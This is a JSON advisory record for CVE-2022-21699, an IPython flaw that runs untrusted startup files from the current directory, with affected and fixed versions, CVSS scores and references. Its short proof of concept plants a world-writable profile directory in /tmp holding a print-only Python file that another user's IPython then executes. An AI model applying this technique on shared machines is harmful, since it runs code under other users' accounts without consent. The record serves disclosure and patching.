{
  "Identifier": "CVE-2022-21699",
  "PackageSlug": "pypi/ipython",
  "Title": "Execution with Unnecessary Privileges in ipython",
  "Description": "Weâ€™d like to disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.\n\nProof of concept\n\nUser1:\n```\nmkdir -m 777 /tmp/profile_default\nmkdir -m 777 /tmp/profile_default/startup\necho 'print(\"stealing your private secrets\")' \u003e /tmp/profile_default/startup/foo.py\n```\n\nUser2:\n```\ncd /tmp\nipython\n```\n\n\n\nUser2 will see:\n```\nPython 3.9.7 (default, Oct 25 2021, 01:04:21)\nType 'copyright', 'credits' or 'license' for more information\nIPython 7.29.0 -- An enhanced Interactive Python. Type '?' for help.\nstealing your private secrets\n```",
  "Date": "2024-09-27",
  "Pubdate": "2022-01-21",
  "AffectedRange": "\u003c5.11||\u003e=6.0.0,\u003c7.16.3||\u003e=7.17.0,\u003c7.31.1||\u003e=8.0.0,\u003c8.0.1",
  "FixedVersions": [
    "5.11",
    "7.16.3",
    "7.31.1",
    "8.0.1"
  ],
  "AffectedVersions": "All versions before 5.11, all versions starting from 6.0.0 before 7.16.3, all versions starting from 7.17.0 before 7.31.1, all versions starting from 8.0.0 before 8.0.1",
  "NotImpacted": "All versions starting from 5.11 before 6.0.0, all versions starting from 7.16.3 before 7.17.0, all versions starting from 7.31.1 before 8.0.0, all versions starting from 8.0.1",
  "Solution": "Upgrade to versions 5.11, 7.16.3, 7.31.1, 8.0.1 or above.",
  "Urls": [
    "https://nvd.nist.gov/vuln/detail/CVE-2022-21699",
    "https://github.com/advisories/GHSA-pq7m-3gw7-gq5x",
    "https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x",
    "https://github.com/ipython/ipython/commit/46a51ed69cdf41b4333943d9ceeb945c4ede5668",
    "https://github.com/ipython/ipython/commit/5fa1e409d2dc126c456510c16ece18e08b524e5b",
    "https://github.com/ipython/ipython/commit/67ca2b3aa9039438e6f80e3fccca556f26100b4d",
    "https://github.com/ipython/ipython/commit/a06ca837273271b4acb82c29be97c0b6d12a30ea",
    "https://github.com/ipython/ipython",
    "https://github.com/pypa/advisory-database/tree/main/vulns/ipython/PYSEC-2022-12.yaml",
    "https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699",
    "https://lists.debian.org/debian-lts-announce/2022/01/msg00021.html",
    "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/CRQRTWHYXMLDJ572VGVUZMUPEOTPM3KB",
    "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DZ7LVZBB4D7KVSFNEQUBEHFO3JW6D2ZK"
  ],
  "CvssV2": "AV:L/AC:L/Au:N/C:P/I:P/A:P",
  "CvssV3": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
  "UUID": "b4534551-5fba-4bec-abaa-e8390e815a96"
}